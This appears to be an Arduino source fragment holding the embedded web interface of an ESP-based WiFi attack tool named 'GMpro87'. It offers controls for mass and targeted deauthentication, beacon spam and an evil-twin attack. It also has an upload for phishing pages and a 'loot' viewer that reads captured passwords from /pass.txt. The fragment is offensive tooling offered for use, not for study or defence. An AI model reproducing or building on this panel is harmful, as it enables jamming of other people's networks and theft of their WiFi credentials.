const char INDEX_HTML[] PROGMEM = R"=====(
<!DOCTYPE html><html><head><meta name='viewport' content='width=device-width,initial-scale=1'>
<style>
:root{--c:#00f2ff;--r:#ff3e3e;--g:#00ff9d;--bg:#050505;--card:#111;}
*{margin:0;padding:0;box-sizing:border-box;font-family:monospace;}
body{background:var(--bg);color:#eee;padding:10px;}
.header{text-align:center;margin-bottom:15px;border-bottom:1px solid #222;padding-bottom:10px;}
.header h1{color:var(--c);font-size:1.3rem;letter-spacing:2px;}
.header p{font-size:0.7rem;color:#666;}
.tabs{display:flex;gap:5px;margin-bottom:15px;}
.tab-btn{flex:1;padding:10px;background:#1a1a1a;border:1px solid #333;color:#888;cursor:pointer;font-size:0.7rem;}
.tab-btn.active{border-bottom:2px solid var(--c);color:var(--c);background:#222;}
.content{display:none;} .content.active{display:block;}
.card{background:var(--card);border:1px solid #222;padding:12px;border-radius:8px;margin-bottom:10px;}
h3{color:var(--c);font-size:0.7rem;margin-bottom:8px;text-transform:uppercase;border-left:3px solid var(--c);padding-left:8px;}
.btn{width:100%;padding:12px;margin:4px 0;background:#1a1a1a;border:1px solid #444;color:#fff;font-weight:bold;cursor:pointer;border-radius:4px;font-size:0.8rem;}
.on{border-color:var(--c);color:var(--c);box-shadow:0 0 10px rgba(0,242,255,0.2);}
.log-box{background:#000;height:120px;overflow-y:auto;padding:8px;font-size:10px;color:var(--g);border:1px solid #222;}
table{width:100%;font-size:10px;border-collapse:collapse;} 
th{color:#666;text-align:left;padding:5px;border-bottom:1px solid #333;}
td{padding:8px 5px;border-bottom:1px solid #1a1a1a;}
.sel-btn{background:var(--c);color:#000;border:none;padding:3px 6px;border-radius:2px;font-weight:bold;}
</style></head><body>
<div class='header'><h1>GMpro87</h1><p>(by : 9u5M4n9)</p></div>
<div class='tabs'>
<button class='tab-btn active' onclick="opTab(event,'atk')">ATTACK</button>
<button class='tab-btn' onclick="opTab(event,'fil')">FILES</button>
<button class='tab-btn' onclick="opTab(event,'set')">SET</button>
</div>
<div id='atk' class='content active'>
<div class='card'><h3>Log Dashboard</h3><div class='log-box' id='logs'>Ready...</div></div>
<div class='card'><h3>Attack Engine</h3>
<button id='m' class='btn' onclick="tg('kill','m')">MASS DEAUTH</button>
<button id='d' class='btn' onclick="tg('deauth','d')">TARGET DEAUTH</button>
<button id='s' class='btn' onclick="tg('spam','s')">BEACON SPAM</button>
<button id='e' class='btn' onclick="tg('evil','e')">EVIL TWIN</button></div>
<div class='card'><h3>WiFi Scanner</h3><button class='btn' onclick='scan()'>SCAN</button>
<table><thead><tr><th>SSID</th><th>CH</th><th>USR</th><th>SIG</th><th>ACT</th></tr></thead><tbody id='list'></tbody></table></div>
</div>
<div id='fil' class='content'>
<div class='card'><h3>Upload Page</h3><input type='file' id='f' style='font-size:10px'><button class='btn' onclick='up()'>UPLOAD HTML</button></div>
<div class='card'><h3>Captured</h3><div class='log-box' id='loot' style='color:#ffc107'></div><button class='btn' onclick='ldLoot()'>REFRESH LOOT</button></div>
</div>
<div id='set' class='content'>
<div class='card'><h3>AP Settings</h3><input type='text' id='aS' placeholder='SSID'><input type='text' id='aP' placeholder='PASS'><button class='btn' onclick='save()'>SAVE & REBOOT</button></div>
<div class='card'><h3>Spam</h3><input type='number' id='bN' placeholder='Amount'><button class='btn' onclick='stSpam()'>SET</button></div>
</div>
<script>
function opTab(e,n){var i,c,t;c=document.getElementsByClassName('content');for(i=0;i<c.length;i++)c[i].style.display='none';
t=document.getElementsByClassName('tab-btn');for(i=0;i<t.length;i++)t[i].className=t[i].className.replace(' active','');
document.getElementById(n).style.display='block';e.currentTarget.className+=' active';}
function scan(){fetch('/scan').then(r=>r.json()).then(data=>{let h='';data.forEach(n=>{
let ssid = n.s == "" ? "<i style='color:#666'>[HIDDEN]</i>" : n.s;
h+='<tr><td>'+ssid+'</td><td>'+n.c+'</td><td>'+n.u+'</td><td>'+n.r+'%</td><td><button class="sel-btn" onclick="sel(\''+n.b+'\',\''+n.s+'\','+n.c+')">SEL</button></td></tr>';});
document.getElementById('list').innerHTML=h;});}
function sel(b,s,c){fetch('/select?b='+b+'&s='+s+'&c='+c).then(()=>alert('Locked!'));}
function tg(m,i){fetch('/toggle?m='+m).then(()=>document.getElementById(i).classList.toggle('on'));}
function up(){var f=document.getElementById('f').files[0];var d=new FormData();d.append('file',f);fetch('/upload',{method:'POST',body:d}).then(()=>alert('OK!'));}
function save(){fetch('/config?s='+document.getElementById('aS').value+'&p='+document.getElementById('aP').value);}
function stSpam(){fetch('/setspam?n='+document.getElementById('bN').value);}
function ldLoot(){fetch('/pass.txt').then(r=>r.text()).then(t=>document.getElementById('loot').innerText=t);}
setInterval(function(){fetch('/getlogs').then(r=>r.text()).then(t=>{if(t.length>2){var l=document.getElementById('logs');l.innerHTML+=t;l.scrollTop=l.scrollHeight;}});},1000);
</script></body></html>
)=====";
